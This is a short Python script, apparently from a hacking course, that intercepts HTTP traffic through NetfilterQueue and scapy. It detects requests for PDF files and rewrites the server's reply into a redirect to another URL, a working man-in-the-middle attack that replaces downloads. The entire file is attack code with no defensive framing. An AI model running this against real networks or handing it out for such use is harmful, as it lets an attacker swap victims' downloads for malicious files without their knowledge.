#!/usr/bin/env

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []
def print_and_accept(pkt):
    scapy_packet = scapy.IP(pkt.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try : 
            if scapy_packet[scapy.TCP].dport == 80:
                #print("HTTP request")
                if ".pdf" in str(scapy_packet[scapy.Raw].load) :
                    print("[+] .pdf request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    #print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport ==80:
                #print("HTTP response")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] replacing file")
                    str_load  = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.github.com/ouardaoui\n\n"
                    scapy_packet[scapy.Raw].load = str_load
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    #print(scapy_packet.show())
                    pkt.set_payload(bytes(scapy_packet))
        except IndexError : 
            pass
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('something went wrong')

nfqueue.unbind()
